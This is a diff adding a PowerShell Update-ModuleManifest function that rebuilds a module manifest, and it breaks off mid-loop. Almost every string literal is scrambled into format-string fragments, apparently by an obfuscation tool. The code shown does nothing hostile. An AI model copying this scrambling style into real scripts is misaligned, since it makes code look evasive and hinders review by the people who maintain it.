@@ -1,0 +1,976 @@
+function Update-ModuleManifest
+{
+    
+    [CmdletBinding(SupportsShouldProcess=$true,
+                   PositionalBinding=$false,
+                   HelpUri=("{3}{12}{9}{7}{11}{6}{8}{1}{5}{10}{2}{4}{0}"-f '311','wlink/','kId=','https:/','619','?','c','sof','om/f','o','Lin','t.','/go.micr'))]
+    Param
+    (
+        [Parameter(Mandatory=$true,
+                   Position=0,
+                   ValueFromPipelineByPropertyName=$true)]
+        [ValidateNotNullOrEmpty()]
+        [string]
+        $Path,
+
+        [ValidateNotNullOrEmpty()]
+        [Object[]]
+        $NestedModules,
+
+        [ValidateNotNullOrEmpty()]
+        [Guid]
+        $Guid,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string]
+        $Author,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $CompanyName,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string]
+        $Copyright,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string]
+        $RootModule,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Version]
+        $ModuleVersion,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string]
+        $Description,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [System.Reflection.ProcessorArchitecture]
+        $ProcessorArchitecture,
+
+        [Parameter()]
+        [ValidateSet({"{2}{0}{1}" -f 't','op','Desk'},{"{0}{1}"-f'C','ore'})]
+        [string[]]
+        $CompatiblePSEditions,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Version]
+        $PowerShellVersion,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Version]
+        $ClrVersion,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Version]
+        $DotNetFrameworkVersion,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $PowerShellHostName,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Version]
+        $PowerShellHostVersion,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Object[]]
+        $RequiredModules,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $TypesToProcess,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $FormatsToProcess,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $ScriptsToProcess,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $RequiredAssemblies,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $FileList,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [object[]]
+        $ModuleList,
+
+        [Parameter()]
+        [string[]]
+        $FunctionsToExport,
+
+        [Parameter()]
+        [string[]]
+        $AliasesToExport,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $VariablesToExport,
+
+        [Parameter()]
+        [string[]]
+        $CmdletsToExport,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $DscResourcesToExport,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [System.Collections.Hashtable]
+        $PrivateData,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $Tags,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Uri]
+        $ProjectUri,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Uri]
+        $LicenseUri,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Uri]
+        $IconUri,
+
+        [Parameter()]
+        [string[]]
+        $ReleaseNotes,
+
+        [Parameter()]
+        [string]
+        $Prerelease,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [Uri]
+        $HelpInfoUri,
+
+        [Parameter()]
+        [switch]
+        $PassThru,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $DefaultCommandPrefix,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $ExternalModuleDependencies,
+
+        [Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $PackageManagementProviders,
+
+        [Parameter()]
+        [switch]
+        $RequireLicenseAcceptance
+
+
+    )
+
+    if(-not (Microsoft.PowerShell.Management\Test-Path -Path $Path -PathType Leaf))
+    {
+        $message = $LocalizedData.UpdateModuleManifestPathCannotFound -f ($Path)
+        ThrowError -ExceptionName ("{2}{1}{4}{3}{0}{5}"-f'e','te','Sys','Argum','m.','ntException') `
+                   -ExceptionMessage $message `
+                   -ErrorId ("{5}{2}{3}{1}{4}{0}"-f'ePath','eManifestFi','ali','dModul','l','Inv') `
+                   -ExceptionObject $Path `
+                   -CallerPSCmdlet $PSCmdlet `
+                   -ErrorCategory InvalidArgument
+    }
+
+    $ModuleManifestHashTable = $null
+
+    try
+    {
+        $ModuleManifestHashTable = Get-ManifestHashTable -Path $Path -CallerPSCmdlet $PSCmdlet
+    }
+    catch
+    {
+        $message = $LocalizedData.TestModuleManifestFail -f ($_.Exception.Message)
+        ThrowError -ExceptionName ("{1}{3}{4}{2}{0}"-f'on','System.Argumen','cepti','tE','x') `
+                    -ExceptionMessage $message `
+                    -ErrorId ("{0}{3}{1}{6}{2}{5}{4}"-f 'Inv','od','leM','alidM','ile','anifestF','u') `
+                    -ExceptionObject $Path `
+                    -CallerPSCmdlet $PSCmdlet `
+                    -ErrorCategory InvalidArgument
+        return
+    }
+
+    
+    $moduleInfo = $null
+
+    try
+    {
+        $moduleInfo = Microsoft.PowerShell.Core\Test-ModuleManifest -Path $Path -ErrorAction Stop
+    }
+    catch
+    {
+        
+        
+        if(-not $moduleInfo)
+        {
+            $message = $LocalizedData.TestModuleManifestFail -f ($_.Exception.Message)
+            ThrowError -ExceptionName ("{2}{5}{0}{6}{3}{1}{4}"-f 'u','o','Syste','entExcepti','n','m.Arg','m') `
+                       -ExceptionMessage $message `
+                       -ErrorId ("{4}{3}{2}{0}{1}" -f 'festFi','le','i','an','InvalidModuleM') `
+                       -ExceptionObject $Path `
+                       -CallerPSCmdlet $PSCmdlet `
+                       -ErrorCategory InvalidArgument
+            return
+        }
+    }
+
+    
+    $params = @{}
+
+    
+    if($NestedModules)
+    {
+        $params.Add(("{0}{2}{1}{3}" -f'N','edModu','est','les'),$NestedModules)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{2}{3}{0}{1}" -f'dMo','dules','Ne','ste')))
+    {
+        $params.Add(("{2}{1}{3}{0}" -f's','odu','NestedM','le'),$ModuleManifestHashtable.NestedModules)
+    }
+
+    
+    if($Guid)
+    {
+        $params.Add(("{1}{0}" -f'd','Gui'),$Guid)
+    }
+    elseif($moduleInfo.Guid)
+    {
+        $params.Add(("{1}{0}" -f'uid','G'),$moduleInfo.Guid)
+    }
+
+    if($Author)
+    {
+        $params.Add(("{0}{2}{1}"-f'Au','or','th'),$Author)
+    }
+    elseif($moduleInfo.Author)
+    {
+        $params.Add(("{1}{2}{0}" -f 'r','Au','tho'),$moduleInfo.Author)
+    }
+
+    if($CompanyName)
+    {
+        $params.Add(("{2}{0}{3}{1}" -f'mpa','yName','Co','n'),$CompanyName)
+    }
+    elseif($moduleInfo.CompanyName)
+    {
+        $params.Add(("{0}{2}{1}{3}" -f 'Com','m','panyNa','e'),$moduleInfo.CompanyName)
+    } 
+    else  
+    {
+        
+        
+        $params.Add(("{0}{2}{1}"-f'CompanyNa','e','m'), ("{3}{2}{5}{4}{7}{6}{1}{0}" -f'_','NFUNCTION_','DCO','__UPDATE','PANYNAMETOB','M','CEDI','EREPLA'))
+    }
+
+    if($Copyright)
+    {
+        $params.Add(("{0}{2}{1}{3}" -f'Cop','h','yRig','t'),$Copyright)
+    }
+    elseif($moduleInfo.Copyright)
+    {
+        $params.Add(("{1}{0}"-f 'ight','Copyr'),$moduleInfo.Copyright)
+    }
+
+    if($RootModule)
+    {
+        $params.Add(("{1}{2}{0}"-f'ule','Roo','tMod'),$RootModule)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{1}{2}{0}" -f 'ule','o','tMod','Ro')) -and $moduleInfo.RootModule)
+    {
+        $params.Add(("{2}{0}{1}" -f'o','dule','RootM'),$ModuleManifestHashTable.RootModule)
+    }
+
+    if($ModuleVersion)
+    {
+        $params.Add(("{1}{2}{0}"-f 'ion','ModuleV','ers'),$ModuleVersion)
+    }
+    elseif($moduleInfo.Version)
+    {
+        $params.Add(("{0}{1}{2}" -f'M','oduleVers','ion'),$moduleInfo.Version)
+    }
+
+    if($Description)
+    {
+        $params.Add(("{2}{0}{1}"-f 'cri','ption','Des'),$Description)
+    }
+    elseif($moduleInfo.Description)
+    {
+        $params.Add(("{0}{2}{3}{1}" -f'Desc','n','ripti','o'),$moduleInfo.Description)
+    }
+
+    if($ProcessorArchitecture)
+    {
+        $params.Add(("{5}{4}{3}{0}{2}{1}"-f 'itectu','e','r','h','ssorArc','Proce'),$ProcessorArchitecture)
+    }
+    
+    elseif($moduleInfo.ProcessorArchitecture -and $moduleInfo.ProcessorArchitecture -ne ("{0}{1}"-f 'Non','e'))
+    {
+        $params.Add(("{3}{5}{2}{0}{1}{6}{4}" -f'rArch','ite','sso','Pro','ture','ce','c'),$moduleInfo.ProcessorArchitecture)
+    }
+
+    if($PowerShellVersion)
+    {
+        $params.Add(("{0}{2}{4}{1}{3}{5}"-f'Pow','rs','erShel','i','lVe','on'),$PowerShellVersion)
+    }
+    elseif($moduleinfo.PowerShellVersion)
+    {
+        $params.Add(("{1}{2}{0}{3}{4}"-f 'e','P','owerSh','l','lVersion'),$moduleinfo.PowerShellVersion)
+    }
+
+    if($ClrVersion)
+    {
+        $params.Add(("{2}{0}{1}" -f'ers','ion','ClrV'),$ClrVersion)
+    }
+    elseif($moduleInfo.ClrVersion)
+    {
+        $params.Add(("{3}{1}{0}{2}"-f'ersio','V','n','Clr'),$moduleInfo.ClrVersion)
+    }
+
+    if($DotNetFrameworkVersion)
+    {
+        $params.Add(("{0}{4}{3}{2}{1}" -f'DotNetFr','sion','r','orkVe','amew'),$DotNetFrameworkVersion)
+    }
+    elseif($moduleInfo.DotNetFrameworkVersion)
+    {
+        $params.Add(("{1}{3}{5}{0}{2}{6}{4}" -f'rkV','D','e','ot','on','NetFramewo','rsi'),$moduleInfo.DotNetFrameworkVersion)
+    }
+
+    if($PowerShellHostName)
+    {
+        $params.Add(("{2}{0}{4}{5}{3}{1}" -f'owerShe','me','P','a','ll','HostN'),$PowerShellHostName)
+    }
+    elseif($moduleInfo.PowerShellHostName)
+    {
+        $params.Add(("{1}{2}{0}{3}" -f 'lHostNam','PowerSh','el','e'),$moduleInfo.PowerShellHostName)
+    }
+
+    if($PowerShellHostVersion)
+    {
+        $params.Add(("{6}{2}{5}{1}{4}{0}{3}"-f 'Vers','Shel','we','ion','lHost','r','Po'),$PowerShellHostVersion)
+    }
+    elseif($moduleInfo.PowerShellHostVersion)
+    {
+        $params.Add(("{3}{2}{0}{1}{4}"-f 'hell','HostVersio','rS','Powe','n'),$moduleInfo.PowerShellHostVersion)
+    }
+
+    if($RequiredModules)
+    {
+        $params.Add(("{3}{4}{1}{2}{0}" -f 'les','Mo','du','Requ','ired'),$RequiredModules)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{4}{1}{3}{2}{0}"-f 'es','e','edModul','quir','R')) -and $moduleInfo.RequiredModules)
+    {
+        $params.Add(("{4}{2}{0}{1}{3}" -f 'dModul','e','quire','s','Re'),$ModuleManifestHashtable.RequiredModules)
+    }
+
+    if($TypesToProcess)
+    {
+        $params.Add(("{1}{0}{3}{2}"-f 'Proc','TypesTo','s','es'),$TypesToProcess)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{0}{1}{2}"-f'Type','sToPro','cess')) -and $moduleInfo.ExportedTypeFiles)
+    {
+        $params.Add(("{0}{4}{2}{1}{3}"-f 'T','oce','sToPr','ss','ype'),$ModuleManifestHashTable.TypesToProcess)
+    }
+
+    if($FormatsToProcess)
+    {
+        $params.Add(("{2}{1}{3}{5}{4}{0}"-f 'ess','ormat','F','sTo','oc','Pr'),$FormatsToProcess)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{0}{2}{4}{3}{1}" -f'For','s','m','es','atsToProc')) -and $moduleInfo.ExportedFormatFiles)
+    {
+        $params.Add(("{0}{1}{3}{2}{4}"-f'Form','atsToPr','ces','o','s'),$ModuleManifestHashTable.FormatsToProcess)
+    }
+
+    if($ScriptsToProcess)
+    {
+        $params.Add(("{1}{3}{0}{2}" -f 'Pr','Scr','ocess','iptsTo'),$ScriptstoProcess)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{1}{0}{2}"-f 'sToProc','ript','ess','Sc')) -and $moduleInfo.Scripts)
+    {
+        $params.Add(("{1}{3}{4}{0}{2}" -f 'P','Scripts','rocess','T','o'),$ModuleManifestHashTable.ScriptsToProcess)
+    }
+
+    if($RequiredAssemblies)
+    {
+        $params.Add(("{0}{1}{3}{2}"-f 'RequiredA','ss','ies','embl'),$RequiredAssemblies)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{1}{3}{5}{2}{0}{4}"-f 'li','Requ','mb','ir','es','edAsse')) -and $moduleInfo.RequiredAssemblies)
+    {
+        $params.Add(("{0}{4}{1}{2}{3}"-f 'Requir','e','mblie','s','edAss'),$moduleInfo.RequiredAssemblies)
+    }
+
+    if($FileList)
+    {
+        $params.Add(("{2}{0}{1}"-f 'is','t','FileL'),$FileList)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{1}{0}"-f 'ileList','F')) -and $moduleInfo.FileList)
+    {
+        $params.Add(("{2}{1}{0}"-f'ist','eL','Fil'),$ModuleManifestHashTable.FileList)
+    }
+
+    
+    $moduleBase = $moduleInfo.ModuleBase
+    foreach($file in $params[("{1}{0}" -f'ileList','F')])
+    {
+        
+        if(-not [System.IO.Path]::IsPathRooted($file))
+        {
+            $combinedPath = Join-Path $moduleBase -ChildPath $file
+        }
+        else
+        {
+            $combinedPath = $file
+        }
+        if(-not (Microsoft.PowerShell.Management\Test-Path -Type Leaf -LiteralPath $combinedPath))
+        {
+            $message = $LocalizedData.FilePathInFileListNotWithinModuleBase -f ($file,$moduleBase)
+            ThrowError -ExceptionName ("{0}{1}{4}{2}{3}"-f'Syst','em.Arg','n','tException','ume') `
+               -ExceptionMessage $message `
+               -ErrorId ("{6}{5}{0}{2}{1}{4}{7}{3}" -f 'PathInFileLi','Wi','stNot','e','thinM','e','Fil','oduleBas') `
+               -ExceptionObject $file `
+               -CallerPSCmdlet $PSCmdlet `
+               -ErrorCategory InvalidArgument
+
+            return
+        }
+    }
+
+    if($ModuleList)
+    {
+        $params.Add(("{1}{0}{2}"-f'is','ModuleL','t'),$ModuleList)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{2}{1}{0}"-f'eList','odul','M')) -and $moduleInfo.ModuleList)
+    {
+        $params.Add(("{1}{2}{0}"-f 'duleList','M','o'),$ModuleManifestHashtable.ModuleList)
+    }
+
+    if($FunctionsToExport -or $FunctionsToExport -is [array])
+    {
+        $params.Add(("{1}{4}{5}{3}{0}{2}" -f'o','Func','rt','p','tio','nsToEx'),$FunctionsToExport)
+    }
+    elseif($moduleInfo.ExportedFunctions)
+    {
+        
+        if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{2}{3}{1}{0}" -f 'rt','nsToExpo','Funct','io')) -and $ModuleManifestHashTable[("{2}{0}{4}{3}{1}"-f 'ti','ort','Func','sToExp','on')] -eq '*' `
+            -and $moduleInfo.ExportedFunctions.Keys.Count -eq 0)
+        {
+            $params.Add(("{3}{0}{2}{1}" -f'u','ort','nctionsToExp','F'), $ModuleManifestHashTable[("{2}{4}{5}{1}{3}{0}"-f 't','o','Func','Expor','tio','nsT')])
+        }
+        elseif($moduleInfo.Prefix)
+        {
+            
+            
+            $originalFunctions = $moduleInfo.ExportedFunctions.Keys | 
+                foreach-object { $parts = $_ -split '-', 2; $parts[-1] = $parts[-1] -replace "^$($moduleInfo.Prefix)"; $parts -join '-' }
+            $params.Add(("{3}{2}{1}{0}" -f'xport','oE','nctionsT','Fu'), $originalFunctions)
+        }
+        else 
+        {
+            $params.Add(("{2}{3}{1}{0}" -f 'oExport','sT','Functio','n'),($moduleInfo.ExportedFunctions.Keys -split ' '))
+        }
+    }
+    elseif ($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{4}{3}{0}{1}{2}"-f 'ons','ToExpor','t','i','Funct')))
+    {
+        $params.Add(("{3}{1}{0}{2}{4}"-f 'tio','nc','ns','Fu','ToExport'), $ModuleManifestHashTable[("{5}{0}{2}{1}{4}{3}" -f 'nct','o','i','xport','nsToE','Fu')])
+    }
+
+    if($AliasesToExport -or $AliasesToExport -is [array])
+    {
+        $params.Add(("{4}{3}{2}{0}{1}" -f 'r','t','po','ToEx','Aliases'),$AliasesToExport)
+    }
+    elseif($moduleInfo.ExportedAliases)
+    {
+        
+        if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{2}{1}{4}{0}{3}" -f 'sToE','li','A','xport','ase')) -and $ModuleManifestHashTable[("{4}{2}{1}{3}{0}"-f 'port','e','as','sToEx','Ali')] -eq '*' `
+            -and $moduleInfo.ExportedAliases.Keys.Count -eq 0)
+        {
+            $params.Add(("{1}{4}{2}{3}{0}" -f'rt','Alias','oExp','o','esT'), $ModuleManifestHashTable[("{2}{0}{1}{3}"-f 'oEx','por','AliasesT','t')])
+        }
+        elseif($moduleInfo.Prefix)
+        {
+            
+            
+            $originalAliases = $moduleInfo.ExportedAliases.Keys | 
+                ForEach-Object { $parts = $_ -split '-', 2; $parts[-1] = $parts[-1] -replace "^$($moduleInfo.Prefix)"; $parts -join '-' }
+            $params.Add(("{3}{1}{0}{2}"-f'o','oExp','rt','AliasesT'), $originalAliases)   
+        }
+        else 
+        {
+            $params.Add(("{2}{1}{4}{3}{0}"-f'rt','ses','Alia','xpo','ToE'),($moduleInfo.ExportedAliases.Keys -split ' '))
+        }
+    }
+    elseif ($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{1}{2}{0}"-f'ort','sT','oExp','Aliase')))
+    {
+        $params.Add(("{0}{2}{1}" -f'Aliase','rt','sToExpo'), $ModuleManifestHashTable[("{2}{4}{3}{0}{1}" -f'Expor','t','A','asesTo','li')])
+    }
+
+    if($VariablesToExport)
+    {
+        $params.Add(("{0}{3}{4}{2}{1}"-f'Var','rt','xpo','iable','sToE'),$VariablesToExport)
+    }
+    elseif($moduleInfo.ExportedVariables)
+    {
+         
+        if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{2}{0}{1}"-f 'xp','ort','sToE','Variable')) -and $ModuleManifestHashTable[("{0}{3}{4}{2}{1}"-f'Varia','rt','o','blesTo','Exp')] -eq '*' `
+            -and $moduleInfo.ExportedVariables.Keys.Count -eq 0)
+        {
+            $params.Add(("{2}{0}{1}{3}"-f'ablesT','oExpo','Vari','rt'), $ModuleManifestHashTable[("{2}{1}{4}{0}{3}" -f'T','ari','V','oExport','ables')])
+        }
+        else {
+            
+            
+            $params.Add(("{3}{0}{1}{2}{4}" -f'iabl','esT','oEx','Var','port'),($moduleInfo.ExportedVariables.Keys -split ' '))
+        }
+    }
+
+    if($CmdletsToExport -or $CmdletsToExport -is [array])
+    {
+        $params.Add(("{1}{4}{0}{3}{2}" -f 'lets','C','Export','To','md'), $CmdletsToExport)
+    }
+    elseif($moduleInfo.ExportedCmdlets)
+    {
+        
+        if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{1}{4}{2}{0}" -f'Export','d','tsTo','Cm','le')) -and $ModuleManifestHashTable[("{0}{1}{2}{3}"-f'C','m','dletsToExpo','rt')] -eq '*' `
+          -and $moduleInfo.ExportedCmdlets.Count -eq 0)
+        {
+            $params.Add(("{0}{1}{3}{2}" -f 'C','m','etsToExport','dl'), $ModuleManifestHashTable[("{1}{2}{3}{0}"-f't','Cmdle','tsTo','Expor')])
+        }
+        elseif($moduleInfo.Prefix)
+        {
+            
+            
+            $originalCmdlets = $moduleInfo.ExportedCmdlets.Keys | 
+                ForEach-Object { $parts = $_ -split '-', 2; $parts[-1] = $parts[-1] -replace "^$($moduleInfo.Prefix)"; $parts -join '-' }
+            $params.Add(("{2}{4}{3}{1}{0}" -f't','r','Cm','etsToExpo','dl'), $originalCmdlets)
+        }
+        else
+        {
+            $params.Add(("{2}{1}{0}{3}" -f 'ToExpo','mdlets','C','rt'),($moduleInfo.ExportedCmdlets.Keys -split ' '))
+        }
+    }
+    elseif ($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{0}{2}{1}"-f'CmdletsTo','xport','E')))
+    {
+        $params.Add(("{0}{3}{2}{4}{1}"-f 'Cm','port','oE','dletsT','x'), $ModuleManifestHashTable[("{1}{4}{0}{2}{3}" -f'e','Cm','tsToEx','port','dl')])
+    }
+
+    if($DscResourcesToExport)
+    {
+        
+
+        if  (($PSVersionTable.PSVersion -lt ("{0}{1}"-f'5','.0.0')) -or ($PowerShellVersion -and $PowerShellVersion -lt '5.0') `
+             -or (-not $PowerShellVersion -and $moduleInfo.PowerShellVersion -and $moduleInfo.PowerShellVersion -lt '5.0') `
+             -or (-not $PowerShellVersion -and -not $moduleInfo.PowerShellVersion))
+        {
+                ThrowError -ExceptionName ("{5}{3}{4}{2}{0}{1}" -f 'ptio','n','xce','um','entE','System.Arg') `
+                   -ExceptionMessage $LocalizedData.ExportedDscResourcesNotSupportedOnLowerPowerShellVersion `
+                   -ErrorId ("{3}{5}{1}{4}{2}{6}{0}" -f'd','cR','NotS','ExportedD','esources','s','upporte') `
+                   -ExceptionObject $DscResourcesToExport `
+                   -CallerPSCmdlet $PSCmdlet `
+                   -ErrorCategory InvalidArgument
+                return
+        }
+
+        $params.Add(("{1}{3}{0}{2}{5}{4}"-f 'es','DscRes','ToExpo','ourc','t','r'),$DscResourcesToExport)
+    }
+    elseif(Microsoft.PowerShell.Utility\Get-Member -InputObject $moduleInfo -name ("{1}{3}{2}{4}{0}" -f 'ces','E','edD','xport','scResour'))
+    {
+        if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{1}{0}{2}{4}" -f 'ur','scReso','cesToExp','D','ort')) -and $ModuleManifestHashTable[("{1}{0}{4}{3}{2}"-f 'urce','DscReso','ort','p','sToEx')] -eq '*' `
+                -and $moduleInfo.ExportedDscResources.Count -eq 0)
+        {
+            $params.Add(("{0}{5}{1}{2}{4}{3}"-f 'DscR','ourcesT','o','xport','E','es'), $ModuleManifestHashTable[("{6}{3}{0}{5}{1}{4}{2}" -f 'es','ce','t','R','sToExpor','our','Dsc')]) 
+        }
+        else 
+        {
+            $params.Add(("{1}{0}{2}{3}"-f'scResou','D','rcesToExpor','t'), $moduleInfo.ExportedDscResources)
+        }
+    }
+
+    if($CompatiblePSEditions)
+    {
+        
+        
+        if  (($PSVersionTable.PSVersion -lt ("{1}{0}" -f '.1.0','5')) -or ($PowerShellVersion -and $PowerShellVersion -lt '5.1') `
+             -or (-not $PowerShellVersion -and $moduleInfo.PowerShellVersion -and $moduleInfo.PowerShellVersion -lt '5.1') `
+             -or (-not $PowerShellVersion -and -not $moduleInfo.PowerShellVersion))
+        {
+                ThrowError -ExceptionName ("{4}{3}{2}{0}{1}"-f'entExcept','ion','rgum','.A','System') `
+                           -ExceptionMessage $LocalizedData.CompatiblePSEditionsNotSupportedOnLowerPowerShellVersion `
+                           -ErrorId ("{0}{2}{3}{8}{4}{5}{1}{7}{6}"-f 'Com','or','pa','tiblePS','ditions','NotSupp','d','te','E') `
+                           -ExceptionObject $CompatiblePSEditions `
+                           -CallerPSCmdlet $PSCmdlet `
+                           -ErrorCategory InvalidArgument
+                return
+        }
+
+        $params.Add(("{0}{1}{4}{3}{2}"-f 'Co','mp','itions','iblePSEd','at'), $CompatiblePSEditions)
+    }
+    elseif( (Microsoft.PowerShell.Utility\Get-Member -InputObject $moduleInfo -name ("{0}{1}{3}{2}{4}"-f 'Compatib','lePSEdit','on','i','s')) -and
+            $moduleInfo.CompatiblePSEditions)
+    {
+        $params.Add(("{4}{2}{3}{5}{1}{0}"-f'ns','itio','p','a','Com','tiblePSEd'), $moduleInfo.CompatiblePSEditions)
+    }
+
+    if($HelpInfoUri)
+    {
+        $params.Add(("{1}{3}{0}{2}"-f 'lpInfoUr','H','i','e'),$HelpInfoUri)
+    }
+    elseif($moduleInfo.HelpInfoUri)
+    {
+        $params.Add(("{2}{3}{0}{1}"-f'pInf','oUri','He','l'),$moduleInfo.HelpInfoUri)
+    }
+
+    if($DefaultCommandPrefix)
+    {
+        $params.Add(("{2}{1}{0}{3}" -f 'tComman','ul','Defa','dPrefix'),$DefaultCommandPrefix)
+    }
+    elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey(("{3}{1}{0}{4}{5}{2}"-f'tC','aul','x','Def','omm','andPrefi')) -and $ModuleManifestHashTable.DefaultCommandPrefix)
+    {
+        $params.Add(("{0}{3}{5}{1}{4}{2}"-f 'D','om','dPrefix','e','man','faultC'),$ModuleManifestHashTable.DefaultCommandPrefix)
+    }
+
+    
+    $tempPath = Microsoft.PowerShell.Management\Join-Path -Path $moduleInfo.ModuleBase -ChildPath "PSGet_$($moduleInfo.Name).psd1"
+    $params.Add(("{0}{1}" -f'Pa','th'),$tempPath)
+
+    try
+    {
+        
+        try{
+            Microsoft.PowerShell.Core\New-ModuleManifest @params -Confirm:$false -WhatIf:$false
+            
+            (Get-Content -Path $tempPath) | ForEach-Object {$_ -Replace ("{4}{5}{8}{3}{13}{9}{0}{1}{6}{11}{10}{2}{12}{7}" -f'BEREP','LA','CT','ANYNAME','__UPDATEDC','OM','C','N__','P','O','UN','EDINF','IO','T'), ''} | Set-Content -Path $tempPath -Confirm:$false -WhatIf:$false
+        }
+        catch
+        {
+            $ErrorMessage = $LocalizedData.UpdatedModuleManifestNotValid -f ($Path, $_.Exception.Message)
+            ThrowError -ExceptionName ("{0}{3}{2}{1}{4}{5}"-f'Sy','rgum','m.A','ste','entExc','eption') `
+                       -ExceptionMessage $ErrorMessage `
+                       -ErrorId ("{0}{2}{4}{3}{5}{1}" -f 'NewModuleManif','e','es','F','t','ailur') `
+                       -ExceptionObject $params `
+                       -CallerPSCmdlet $PSCmdlet `
+                       -ErrorCategory InvalidArgument
+            return
+        }
+
+        
+        $PrivateDataInput = ""
+        $ExistingData = $moduleInfo.PrivateData
+        $Data = @{}
+        if($ExistingData)
+        {
+            foreach($key in $ExistingData.Keys)
+            {
+                if($key -ne ("{1}{0}"-f 'ata','PSD')){
+                    $Data.Add($key,$ExistingData[$key])
+                }
+                else
+                {
+                    $PSData = $ExistingData[("{2}{1}{0}" -f 'Data','S','P')]
+                    foreach($entry in $PSData.Keys)
+                    {
+                        $Data.Add($entry,$PSData[$Entry])
+                    }
+                }
+            }
+        }
+
+        if($PrivateData)
+        {
+            foreach($key in $PrivateData.Keys)
+            {
+                
+                if($key -ne ("{0}{1}"-f'PS','Data'))
+                {
+                    $Data[$key] = $PrivateData[$Key]
+                }
+
+                else
+                {
+                    $PSData = $ExistingData[("{1}{0}"-f'a','PSDat')]
+                    foreach($entry in $PSData.Keys)
+                    {
+                        $Data[$entry] = $PSData[$entry]
+                    }
+                }
+            }
+        }
+
+        
+        if($Tags)
+        {
+           $Data[("{1}{0}"-f'ags','T')] = $Tags
+        }
+
+        
+        if($ProjectUri)
+        {
+            $Data[("{0}{1}{2}" -f 'Pro','jectU','ri')] = $ProjectUri
+        }
+
+        if($LicenseUri)
+        {
+            $Data[("{0}{2}{1}" -f'Li','eUri','cens')] = $LicenseUri
+        }
+
+        if($IconUri)
+        {
+            $Data[("{2}{0}{1}" -f'co','nUri','I')] = $IconUri
+        }
+        if($RequireLicenseAcceptance)
+        {
+            $Data[("{1}{2}{0}{4}{3}{5}" -f'ce','RequireLicenseA','c','c','ptan','e')] = $RequireLicenseAcceptance
+        }
+
+        if($ReleaseNotes)
+        {
+            
+            $Data[("{2}{1}{0}" -f 'eNotes','s','Relea')] = $($ReleaseNotes -join "`r`n")
+        }
+
+        if ($Prerelease)
+        {
+            $result = ValidateAndGet-VersionPrereleaseStrings -Version $params[("{1}{2}{0}"-f'n','M','oduleVersio')] -Prerelease $Prerelease -CallerPSCmdlet $PSCmdlet
+            if (-not $result)
+            {
+                
+                
+                return
+            }
+            $validatedPrerelease = $result[("{0}{1}{2}"-f'Pr','er','elease')]
+            $Data[$script:Prerelease] = $validatedPrerelease
+        }
+
+        if($ExternalModuleDependencies)
+        {
+            
+            
+            $DependentModuleNames = @()
+            foreach($moduleInfo in $params[("{0}{1}{3}{2}" -f'N','es','les','tedModu')])
+            {
+                if($moduleInfo.GetType() -eq [System.Collections.Hashtable])
+                {
+                    $DependentModuleNames += $moduleInfo.ModuleName
+                }
+            }
+
+            foreach($moduleInfo in $params[("{3}{0}{1}{2}" -f 'uiredMo','dule','s','Req')])
+            {
+                if($moduleInfo.GetType() -eq [System.Collections.Hashtable])
+                {
+                    $DependentModuleNames += $moduleInfo.ModuleName
+                }
+            }
+
+            foreach($dependency in $ExternalModuleDependencies)
+            {
